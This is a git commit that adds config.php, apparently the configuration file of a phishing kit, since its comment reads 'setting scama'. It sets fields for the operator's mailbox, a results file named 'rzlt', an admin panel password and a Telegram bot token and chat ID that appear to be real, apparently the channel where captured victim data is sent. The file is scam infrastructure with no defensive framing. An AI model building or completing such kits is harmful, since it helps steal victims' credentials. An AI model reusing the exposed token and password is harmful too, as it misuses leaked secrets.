747521f6233d8758a4a24b9cc74d8e2f9950d191
Zaka4 <113629547+Zaka4@users.noreply.github.com>
2022-09-16 00:59:30 +0000

    Add files via upload

---
+++ config.php
@@ -0,0 +1,9 @@
+<?php
+// setting scama
+$yourmail  = "";  // your email 
+$namerand = "rzlt";  // name for file rzult *
+$pass = "+212687280783"; // pass admin panel
+$botToken="5670081988:AAEREQTisbTfYVHJbkbB-VI8NxX57t5nvY8"; // token bot telegram
+$chatId="1441904476";  // chatId telegram
+
+?>
